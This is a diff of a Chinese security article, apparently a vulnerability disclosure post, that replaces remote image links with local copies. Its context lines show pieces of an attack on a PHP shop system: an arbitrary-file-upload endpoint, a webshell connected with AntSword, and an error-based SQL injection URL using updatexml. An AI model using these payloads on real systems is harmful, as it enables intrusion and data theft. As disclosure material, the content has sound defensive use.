@@ -63,16 +63,16 @@ schema_version: "1"
 *   压缩包解压后，将名为后端的文件夹复制到 PHPstudy 目录下，再将文件夹名改成英文
     
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWrgchWAMVLPCg3tbmib7CkAPx3Jf0pEnKCtqqsXp9JAH6iachOcW5iaT7w/640?wx_fmt=jpeg)
+![](../../.resource/remote/375b3a0aa566078d3f4897acdd28571ba4d55b3274f8092037c0b56e1ba91ede.jpg)
 
 *   新建一个数据库
     
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuW6bBKnKiadcpFriakWdp1n9fLODjR1RTicdXPYjZmyicScjMl9kw5HicKpOQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/7dba6cb2a140a73b9c8efd3d26bb4f70ca461a20fa79e2efb1004eaad9afe20d.jpg)
 
 点击 MySQL-front 打开 MySQL，新建一个数据库，在数据库中导入 SQL 文件  
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWqqfjayZulWg4XExjA8QyW1zOAlQtXxbNHTxicKD0iaaXNI2Ndqr4GkJA/640?wx_fmt=jpeg)
+![](../../.resource/remote/65543c9c627f45b0816af9fb5dbd192d9b605803378c04ab3b86e4c4e0388fc4.jpg)
 
 *   修改网站数据配置文件  
     改成英文名的后端文件夹中修改数据库的配置：
@@ -83,7 +83,7 @@ Modules/Common/Conf/db.php
 Modules/Seller/Conf/db.php
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWZ0Lyy3uxmicORCCv2EwzqncfOv6ia0fkib5bEuUD09gDonjRhzGicX0ztQ/640?wx_fmt=jpeg)
+![](../../.resource/remote/f8801cf73c05e38f9c6f3c120e8a461596599c93af74abc74ba57e9d225c219f.jpg)
 
 *   后台管理信息  
     后台地址：域名 / seller.php  
@@ -111,12 +111,12 @@ Content-Type: image/gif
 ------WebKitFormBoundary8UaANmWAgM4BqBSs—
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWXdicPETpgNIiaAUtvkPheXcxU0Dp7mBhqiaA2fKZ9ia0a2TxHDncnuTxaA/640?wx_fmt=jpeg)
+![](../../.resource/remote/508e407cae184de17ec4b5b098b1297a49938e862a861629a0ceb56cfd9e4487.jpg)
 
 *   使用蚁剑连接 shell 测试，成功连接
     
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWicNYeT8oz7Ijbticiaj17RjE7pJ0c5TNDAkuhm8SuiadZT5ejmrnogiaZGw/640?wx_fmt=png)
+![](../../.resource/remote/0f04928fa58744c3b54e453d7a0116514e3706b246bae2823f9908a9a9522398.png)
 
 *   另一个任意文件上传漏洞点：  
     `http://********/wxapp.php?controller=Goods.doPageUpload`
@@ -129,13 +129,13 @@ Content-Type: image/gif
     (报错注入)
     
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqK2icrqCQndkibsLXFBYGvYuWLNJHibBc47MmibaIDaOQ43mjeW1uIPVFC3G4u9XKZwu8phqJlZfJnGbg/640?wx_fmt=jpeg)
+![](../../.resource/remote/181b60a0be90d5ccf061700de4c240d5469f687f02f10298047433a9990082f7.jpg)
 
 *   另一个 SQL 注入漏洞点：  
     `http://**********/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)`
     
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6KuYg7GdjHmJvggbicJmdtVQib23cyWgEwTMiapHjsbHDjsuBMXTmTZobrfqAbzswwxNwbTnJ7hzdLQ/640?wx_fmt=gif)
+![](../../.resource/remote/0f5abdcadaaa61e5f23eecf3818720ad337dc6a25c3479997c9218bac3cb3b8b.gif)
 
   
 
@@ -147,7 +147,7 @@ secteam 公众号
 
 长按识别二维码关注
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/Cnm7wITedqKticW5ZWC15ibIkiassjrnzm49qKOiccGP2afCSib51VfB83AZYBQ0U09vmYVILSh2dlRXUiaojRYxDX0A/640?wx_fmt=jpeg)
+![](../../.resource/remote/c16dd65a38633ba3eb548e504c147f275599c4e6bdfc1b9942f45d37df851340.jpg)
 
 ---
 
